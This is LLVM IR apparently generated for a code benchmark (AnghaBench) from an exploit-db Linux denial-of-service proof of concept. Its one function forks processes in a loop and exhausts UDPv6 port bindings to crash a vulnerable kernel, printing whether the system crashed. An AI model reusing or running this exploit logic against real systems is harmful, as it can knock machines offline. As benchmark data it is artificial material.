; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_26382.c_proof.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_26382.c_proof.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [11 x i8] c"Stage 1...\00", align 1
@errno = common dso_local global i32 0, align 4
@EADDRINUSE = common dso_local global i32 0, align 4
@EMFILE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [32 x i8] c"Stage 2... should crash quickly\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"System not vulnerable\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 ()* @proof to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @proof() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca i32, align 4
  store i32 2, i32* %3, align 4
  %8 = call i32 (...) @get_fd_limit()
  store i32 %8, i32* %2, align 4
  %9 = load i32, i32* %2, align 4
  %10 = icmp sle i32 %9, 3
  br i1 %10, label %11, label %12

11:                                               ; preds = %0
  store i32 -2, i32* %1, align 4
  br label %102

12:                                               ; preds = %0
  %13 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %14 = call i32 @get_port_range(i32* %13)
  %15 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %16 = load i32, i32* %15, align 4
  store i32 %16, i32* %7, align 4
  %17 = call i64 (...) @getpid()
  store i64 %17, i64* %5, align 8
  %18 = call i32 @puts(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  br label %19

19:                                               ; preds = %95, %12
  %20 = call i64 (...) @fork()
  store i64 %20, i64* %4, align 8
  switch i64 %20, label %77 [
    i64 0, label %21
    i64 -1, label %75
  ]

21:                                               ; preds = %19
  store i32 3, i32* %3, align 4
  br label %22

22:                                               ; preds = %29, %21
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* %2, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %32

26:                                               ; preds = %22
  %27 = load i32, i32* %3, align 4
  %28 = call i32 @close(i32 %27)
  br label %29

29:                                               ; preds = %26
  %30 = load i32, i32* %3, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %3, align 4
  br label %22

32:                                               ; preds = %22
  br label %33

33:                                               ; preds = %70, %32
  %34 = load i32, i32* %7, align 4
  %35 = call i32 @bind_udpv6_port(i32 %34)
  %36 = icmp sge i32 %35, 0
  br i1 %36, label %37, label %44

37:                                               ; preds = %33
  %38 = load i32, i32* %7, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %37
  %41 = load i32, i32* %7, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %7, align 4
  br label %43

43:                                               ; preds = %40, %37
  br label %62

44:                                               ; preds = %33
  %45 = load i32, i32* %7, align 4
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %54

47:                                               ; preds = %44
  %48 = load i32, i32* @errno, align 4
  %49 = load i32, i32* @EADDRINUSE, align 4
  %50 = icmp eq i32 %48, %49
  br i1 %50, label %51, label %54

51:                                               ; preds = %47
  %52 = load i32, i32* %7, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %7, align 4
  br label %61

54:                                               ; preds = %47, %44
  %55 = load i32, i32* @errno, align 4
  %56 = load i32, i32* @EMFILE, align 4
  %57 = icmp ne i32 %55, %56
  br i1 %57, label %58, label %60

58:                                               ; preds = %54
  %59 = call i32 @exit(i32 1) #3
  unreachable

60:                                               ; preds = %54
  br label %61

61:                                               ; preds = %60, %51
  br label %62

62:                                               ; preds = %61, %43
  %63 = load i32, i32* %7, align 4
  %64 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %65 = load i32, i32* %64, align 4
  %66 = icmp sgt i32 %63, %65
  br i1 %66, label %67, label %69

67:                                               ; preds = %62
  %68 = call i32 @puts(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %69

69:                                               ; preds = %67, %62
  br label %70

70:                                               ; preds = %69
  %71 = load i32, i32* @errno, align 4
  %72 = load i32, i32* @EMFILE, align 4
  %73 = icmp ne i32 %71, %72
  br i1 %73, label %33, label %74

74:                                               ; preds = %70
  br label %94

75:                                               ; preds = %19
  %76 = call i32 @exit(i32 2) #3
  unreachable

77:                                               ; preds = %19
  %78 = call i32 @wait(i32* %3)
  %79 = load i64, i64* %5, align 8
  %80 = call i64 (...) @getpid()
  %81 = icmp ne i64 %79, %80
  br i1 %81, label %82, label %93

82:                                               ; preds = %77
  %83 = load i32, i32* %3, align 4
  %84 = call i32 @WIFEXITED(i32 %83)
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %86, label %89

86:                                               ; preds = %82
  %87 = load i32, i32* %3, align 4
  %88 = call i32 @WEXITSTATUS(i32 %87)
  br label %90

89:                                               ; preds = %82
  br label %90

90:                                               ; preds = %89, %86
  %91 = phi i32 [ %88, %86 ], [ 2, %89 ]
  %92 = call i32 @exit(i32 %91) #3
  unreachable

93:                                               ; preds = %77
  br label %94

94:                                               ; preds = %93, %74
  br label %95

95:                                               ; preds = %94
  %96 = load i64, i64* %4, align 8
  %97 = icmp eq i64 %96, 0
  br i1 %97, label %19, label %98

98:                                               ; preds = %95
  %99 = call i32 @puts(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %100 = load i32, i32* %3, align 4
  %101 = sub nsw i32 0, %100
  store i32 %101, i32* %1, align 4
  br label %102

102:                                              ; preds = %98, %11
  %103 = load i32, i32* %1, align 4
  ret i32 %103
}

declare dso_local i32 @get_fd_limit(...) #1

declare dso_local i32 @get_port_range(i32*) #1

declare dso_local i64 @getpid(...) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @bind_udpv6_port(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @WIFEXITED(i32) #1

declare dso_local i32 @WEXITSTATUS(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
